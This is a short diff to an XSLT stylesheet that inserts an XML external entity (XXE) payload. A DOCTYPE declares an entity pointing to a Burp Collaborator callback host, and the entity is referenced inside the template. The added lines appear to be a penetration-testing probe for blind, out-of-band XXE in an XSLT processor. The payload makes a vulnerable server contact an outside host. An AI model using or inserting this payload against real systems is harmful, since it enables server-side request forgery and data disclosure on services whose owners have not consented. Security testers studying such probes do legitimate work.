@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE ss [<!ENTITY xxe SYSTEM "http://x42lu7w86sqc3lgt0qi0l632ctil6a.burpcollaborator.net/">]>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:template match="/">
+ xxe: &xxe;
  <html>
  <body>
  Version: <xsl:value-of select="system-property('xsl:version')" /><br />
